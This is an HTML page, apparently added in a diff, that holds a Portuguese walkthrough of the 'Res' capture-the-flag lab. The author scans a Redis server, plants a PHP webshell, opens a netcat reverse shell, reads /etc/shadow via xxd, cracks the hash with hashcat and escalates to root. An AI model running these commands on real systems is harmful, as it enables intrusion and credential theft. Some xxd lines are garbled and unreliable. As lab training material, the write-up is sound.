@@ -1,0 +1,233 @@
+<!DOCTYPE html>
+<html lang="pt-BR" class="scroll-smooth">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Relatório de Lab - Res</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+</head>
+<body class="bg-gradient-to-br from-[#0D1121] via-[#1a2238] to-[#283655] text-white font-sans min-h-screen relative">
+  <!-- Background image decorative -->
+  <div class="pointer-events-none fixed inset-0 z-0 flex justify-center items-center">
+    <img src="https://image.lexica.art/full_webp/6957307a-3542-4118-ae89-54a02851ef3d" alt="background" class="opacity-30 w-full h-auto hidden md:block" />
+  </div>
+  <div class="relative z-10 max-w-5xl mx-auto py-12 px-2 md:px-10">
+    <!-- Cabeçalho -->
+    <header class="mb-10">
+      <div class="bg-gradient-to-r from-blue-900 to-blue-600 rounded-xl shadow-lg p-8 flex flex-col items-center relative">
+        <h1 class="text-4xl md:text-5xl font-extrabold uppercase tracking-widest text-white drop-shadow-lg mb-2">Res</h1>
+        <p class="text-green-100 text-lg">Relatório de Lab <span class="text-green-600">Res</span></p>
+        <p class="mt-2 text-sm text-green-50">Data: <span class="font-semibold">Maio de 2025</span></p>
+        <div class="center mt-6">
+          <a href="../index.html" class="inline-block bg-gradient-to-r from-green-500 to-green-400 text-white font-bold py-2 px-6 rounded-lg shadow hover:from-green-600 hover:to-green-500 transition text-base">← Voltar aos Labs</a>
+        </div>
+      </div>
+    </header>
+
+    <!-- Sumário -->
+    <nav class="mb-12">
+      <div class="bg-white rounded-xl shadow border border-blue-100 overflow-hidden">
+        <div class="flex items-center bg-gradient-to-r from-blue-900 to-blue-700 px-10 py-6">
+          <svg class="w-8 h-8 text-blue-300 mr-4" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M4 6h16M4 12h16M4 18h16"></path></svg>
+          <h2 class="text-3xl font-bold text-white tracking-wide">Sumário</h2>
+        </div>
+        <ul class="divide-y divide-blue-100">
+          <li>
+            <a href="#introducao" class="flex items-center px-10 py-4 group hover:bg-blue-50 transition">
+              <span class="w-3 h-3 rounded-full bg-blue-500 mr-4 group-hover:bg-blue-700 transition"></span>
+              <span class="text-blue-900 text-lg font-medium group-hover:text-blue-700 transition">Introdução</span>
+            </a>
+          </li>
+          <li>
+            <a href="#cenario" class="flex items-center px-10 py-4 group hover:bg-blue-50 transition">
+              <span class="w-3 h-3 rounded-full bg-blue-500 mr-4 group-hover:bg-blue-700 transition"></span>
+              <span class="text-blue-900 text-lg font-medium group-hover:text-blue-700 transition">Cenário do Lab</span>
+            </a>
+          </li>
+          <li>
+            <a href="#enumeracao" class="flex items-center px-10 py-4 group hover:bg-blue-50 transition">
+              <span class="w-3 h-3 rounded-full bg-blue-500 mr-4 group-hover:bg-blue-700 transition"></span>
+              <span class="text-blue-900 text-lg font-medium group-hover:text-blue-700 transition">Enumeração e Exploração Inicial</span>
+            </a>
+          </li>
+          <li>
+            <a href="#shell" class="flex items-center px-10 py-4 group hover:bg-blue-50 transition">
+              <span class="w-3 h-3 rounded-full bg-blue-500 mr-4 group-hover:bg-blue-700 transition"></span>
+              <span class="text-blue-900 text-lg font-medium group-hover:text-blue-700 transition">Obtenção de Shell e Escalonamento de Privilégios</span>
+            </a>
+          </li>
+          <li>
+            <a href="#conclusao" class="flex items-center px-10 py-4 group hover:bg-blue-50 transition">
+              <span class="w-3 h-3 rounded-full bg-blue-500 mr-4 group-hover:bg-blue-700 transition"></span>
+              <span class="text-blue-900 text-lg font-medium group-hover:text-blue-700 transition">Conclusão e Aprendizados</span>
+            </a>
+          </li>
+        </ul>
+      </div>
+    </nav>
+
+    <!-- Introdução -->
+    <section class="mb-12" id="introducao">
+      <div class="bg-white rounded-xl shadow-lg p-8 mb-8 border-l-4 border-blue-700">
+        <h2 class="text-3xl font-bold text-blue-900 mb-5 flex items-center gap-2">
+          <svg class="w-7 h-7 text-blue-700" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M12 4v16m8-8H4"></path></svg>
+          Introdução
+        </h2>
+        <p class="text-gray-800 mb-4 text-lg">
+          O laboratório <strong>Res</strong> propõe um ambiente Linux vulnerável, focado em exploração de serviços, manipulação de banco de dados Redis, obtenção de shells reversos e escalonamento de privilégios utilizando técnicas avançadas. O objetivo é obter acesso root, passando por diferentes etapas de exploração, raciocínio lógico e uso de ferramentas clássicas de pós-exploração.
+        </p>
+        <p class="text-gray-800 mb-4 text-lg">
+          Este relatório detalha cada fase do processo, explicando comandos, decisões e boas práticas para alcançar o objetivo final.
+        </p>
+      </div>
+    </section>
+
+    <!-- Cenário do Lab -->
+    <section class="mb-12" id="cenario">
+      <div class="bg-white rounded-xl shadow-lg p-8 mb-8 border-l-4 border-blue-700">
+        <h2 class="text-3xl font-bold text-blue-900 mb-5 flex items-center gap-2">
+          <svg class="w-7 h-7 text-blue-700" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M12 4v16m8-8H4"></path></svg>
+          Cenário do Lab
+        </h2>
+        <ul class="list-disc pl-6 text-gray-800 text-lg space-y-2">
+          <li>Ambiente Linux com Redis Database exposto e vulnerável.</li>
+          <li>Exploração de webshells e obtenção de shell reverso.</li>
+          <li>Escalonamento de privilégios utilizando técnicas do GTFOBins.</li>
+          <li>Recuperação de credenciais e acesso root.</li>
+        </ul>
+      </div>
+    </section>
+
+    <!-- Enumeração e Exploração Inicial -->
+    <section class="mb-12" id="enumeracao">
+      <div class="bg-white rounded-xl shadow-lg p-8 mb-8 border-l-4 border-blue-700">
+        <h2 class="text-3xl font-bold text-blue-900 mb-5 flex items-center gap-2">
+          <svg class="w-7 h-7 text-blue-700" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M12 4v16m8-8H4"></path></svg>
+          Enumeração e Exploração Inicial
+        </h2>
+        <p class="text-gray-800 mb-4 text-lg">
+          O primeiro passo foi realizar uma varredura de portas e serviços utilizando o <strong>nmap</strong> para identificação. Inicialmente, usei
+        </p>
+        <pre class="bg-gray-200 text-gray-800 p-3 rounded-md overflow-x-auto text-sm mb-4">
+nmap -v -Pn -sV 10.10.14.249
+nmap -v -Pn -sV 10.10.14.249 -T4
+nmap -v -sV 10.10.14.249 -T5
+        </pre>
+        <p class="text-gray-800 mb-4 text-lg">
+          Mas todos resultaram apenas uma porta, busquei outra solução, e executando o seguinte deu certo, e também foi revelado o gerenciador de banco de dados (como já era indicado pelo próprio titulo da Room…).
+        </p>
+        <pre class="bg-gray-200 text-gray-800 p-3 rounded-md overflow-x-auto text-sm mb-4">
+nmap -v -p- --min-rate 1000 -sV MACHINE_IP
+        </pre>
+        <img src="../images/images-res/image.png" alt="Nmap scan" class="rounded-xl border border-blue-200 shadow w-full max-w-3xl mx-auto mb-6">
+        <p class="text-gray-800 mb-4 text-lg">
+          Agora precisamos “trabalhar” no CLI desse banco de dados, podemos usar 
+        </p>
+        <pre class="bg-gray-200 text-gray-800 p-3 rounded-md overflow-x-auto text-sm mb-4">
+redis-cli -h MACHINE_IP
+info SERVER
+        </pre>
+        <img src="../images/images-res/image 1.png" alt="Redis info" class="rounded-xl border border-blue-200 shadow w-full max-w-3xl mx-auto mb-6">
+        <p class="text-gray-800 mb-4 text-lg">
+          Com a versão identificada, a Room joga a bola para a gent,  comprometer a máquina e localizar o arquivo <span class="font-mono bg-gray-100 px-1 rounded">users.txt</span>. Sabendo que o diretório padrão do webserver é <span class="font-mono bg-gray-100 px-1 rounded">/var/www/html</span>, configuramos o Redis para criar um webshell.
+        </p>
+        <img src="../images/images-res/image 2.png" alt="Configuração Redis" class="rounded-xl border border-blue-200 shadow w-full max-w-3xl mx-auto mb-6">
+        <p class="text-gray-800 mb-4 text-lg">
+          Após a configuração, acessamos <span class="font-mono bg-gray-100 px-1 rounded">MACHINE_IP/shell.php</span> e obtivemos um webshell funcional.
+        </p>
+        <img src="../images/images-res/image 3.png" alt="Webshell" class="rounded-xl border border-blue-200 shadow w-full max-w-3xl mx-auto mb-6">
+        <p class="text-gray-800 mb-4 text-lg">
+          Com o webshell, foi possível executar comandos diretamente pela URL, como <span class="font-mono bg-gray-100 px-1 rounded">?cmd=ls</span>, facilitando a enumeração de arquivos e diretórios.
+        </p>
+        <img src="../images/images-res/image 4.png" alt="Comando ls" class="rounded-xl border border-blue-200 shadow w-full max-w-3xl mx-auto mb-6">
+        <p class="text-gray-800 mb-4 text-lg">
+          Mas a usabilidade desse shell pela URL está péssima, então precisamos de uma <strong>reverse shell</strong>.
+        </p>
+      </div>
+    </section>
+
+    <!-- Obtenção de Shell e Escalonamento de Privilégios -->
+    <section class="mb-12" id="shell">
+      <div class="bg-white rounded-xl shadow-lg p-8 mb-8 border-l-4 border-blue-800">
+        <h2 class="text-3xl font-bold text-cyan-900 mb-5 flex items-center gap-2">
+          <svg class="w-7 h-7 text-cyan-800" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M12 4v16m8-8H4"></path></svg>
+          Obtenção de Shell e Escalonamento de Privilégios
+        </h2>
+        <p class="text-gray-800 mb-4 text-lg">
+          Para obter um reverse shell, iniciamos um listener na máquina atacante:
+        </p>
+        <pre class="bg-gray-200 text-gray-800 p-3 rounded-md overflow-x-auto text-sm mb-4">
+nc -lnvp 4545
+        </pre>
+        <p class="text-gray-800 mb-4 text-lg">
+          Em seguida, na url podemos usar <span class="font-mono bg-gray-100 px-1 rounded">`nc MACHINE_IP 4545 -e /bin/sh`</span> na URL. E temos o shell:
+        </p>
+        <pre class="bg-gray-200 text-gray-800 p-3 rounded-md overflow-x-auto text-sm mb-4">
+nc MACHINE_IP 4545 -e /bin/sh
+        </pre>
+        <img src="../images/images-res/image 5.png" alt="Reverse shell" class="rounded-xl border border-cyan-200 shadow w-full max-w-3xl mx-auto mb-6">
+        <p class="text-gray-800 mb-4 text-lg">
+          Com a shell ativada, foi possível navegar até o diretório <span class="font-mono bg-gray-100 px-1 rounded">/home</span> e vemos que só tem um usuário, e podemos encontrar a key.
+        </p>
+        <img src="../images/images-res/image 6.png" alt="User key" class="rounded-xl border border-cyan-200 shadow w-full max-w-3xl mx-auto mb-6">
+        <p class="text-gray-800 mb-4 text-lg">
+          Para escalar privilégios, precisei do <strong>GTFOBins</strong>, explorando o binário <span class="font-mono bg-gray-100 px-1 rounded">xxd</span> para ler arquivos restritos, como <span class="font-mono bg-gray-100 px-1 rounded">/etc/shadow</span> para obter o hash da senha:
+        </p>
+        <img src="../images/images-res/image 7.png" alt="GTFOBins xxd" class="rounded-xl border border-cyan-200 shadow w-full max-w-3xl mx-auto mb-6">
+        <pre class="bg-gray-200 text-gray-800 p-3 rounded-md overflow-x-auto text-sm mb-4">
+LFILE=/root/root.txt
+usr/bin/xxd "$LFILE" | xxd -r usr/bin/xxd "$LFILE" | xxd -r
+        </pre>
+        <p class="text-gray-800 mb-4 text-lg">
+          Com isso, podemos usar <span class="font-mono bg-gray-100 px-1 rounded">`xxd /etc/shadow`</span>, mas o resultado apareceu “quebrado”:
+        <img src="../images/images-res/image 8.png" alt="Shadow decode" class="rounded-xl border border-cyan-200 shadow w-full max-w-3xl mx-auto mb-6">
+        </p>
+        <p class="text-gray-800 mb-4 text-lg">
+            isso pode ser resolvido usando <span class="font-mono bg-gray-100 px-1 rounded">xxd /etc/shadow | xxd -rxxd -r</span>
+        </p>
+        <p class="text-gray-800 mb-4 text-lg">
+          Com o hash extraído do arquivo <span class="font-mono bg-gray-100 px-1 rounded">/etc/shadow</span> usei o <strong>hashcat</strong> para quebra de senha:
+        </p>
+        <pre class="bg-gray-200 text-gray-800 p-3 rounded-md overflow-x-auto text-sm mb-4">
+hashcat -a 0 -m 1800 'hash' /usr/share/wordlists/rockyou.txt
+        </pre>
+        <img src="../images/images-res/image 9.png" alt="Hashcat" class="rounded-xl border border-cyan-200 shadow w-full max-w-3xl mx-auto mb-6">
+        <p class="text-gray-800 mb-4 text-lg">
+          Com isso, temos a senha do user <strong>vianka</strong>. Mas com o shell nesse momento não foi possível usar a senha, então precisei de um “upgrade” com
+        </p>
+        <pre class="bg-gray-200 text-gray-800 p-3 rounded-md overflow-x-auto text-sm mb-4">
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+        </pre>
+        <p class="text-gray-800 mb-4 text-lg">
+          Estando como vianka não foi possivel acessar o /root. Porém foi possivel usar <span class="font-mono bg-gray-100 px-1 rounded">sudo su</span> e conseguimos esse acesso com a mesma senha.
+        </p>
+        <img src="../images/images-res/image 10.png" alt="Root access" class="rounded-xl border border-cyan-200 shadow w-full max-w-3xl mx-auto mb-6">
+      </div>
+    </section>
+
+    <!-- Conclusão e Aprendizados -->
+    <div class="bg-white rounded-xl shadow-lg p-8 mb-8 border-l-4 border-blue-700" id="conclusao">
+      <h2 class="text-3xl font-bold text-blue-900 mb-5 flex items-center gap-2">
+        <svg class="w-7 h-7 text-blue-700" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M12 4v16m8-8H4"></path></svg>
+        Conclusão e Aprendizados
+      </h2>
+      <ul class="list-disc pl-6 space-y-2 text-lg">
+        <li class="text-gray-800">A importância de ajustar técnicas de enumeração conforme o ambiente, utilizando diferentes parâmetros do Nmap.</li>
+        <li class="text-gray-800">Exploração de serviços de banco de dados expostos pode levar ao comprometimento total do sistema.</li>
+        <li class="text-gray-800">A obtenção de shells reversos é fundamental para pós-exploração eficiente.</li>
+        <li class="text-gray-800">O uso de técnicas do GTFOBins permite a leitura de arquivos sensíveis mesmo sem privilégios root diretos.</li>
+        <li class="text-gray-800">A quebra de hashes e o uso de wordlists são essenciais para escalar privilégios em ambientes Linux.</li>
+        <li class="text-gray-800">O upgrade de shell e o uso correto de <span class="font-mono bg-gray-100 px-1 rounded">sudo</span> podem ser passos finais para obtenção de acesso root.</li>
+      </ul>
+      <p class="text-gray-800 mt-6 text-lg">
+        O lab Res é excelente para praticar conhecimentos em enumeração, exploração de serviços, pós-exploração e escalonamento de privilégios em sistemas Linux.
+      </p>
+    </div>
+
+    <!-- Botão de Voltar -->
+    <div class="text-center mt-12">
+      <a href="../index.html" class="inline-block bg-gradient-to-r from-green-500 to-green-400 text-white font-bold py-3 px-8 rounded-lg shadow hover:from-green-600 hover:to-green-500 transition text-lg">← Voltar aos Labs</a>
+    </div>
+  </div>
+</body>
+</html>
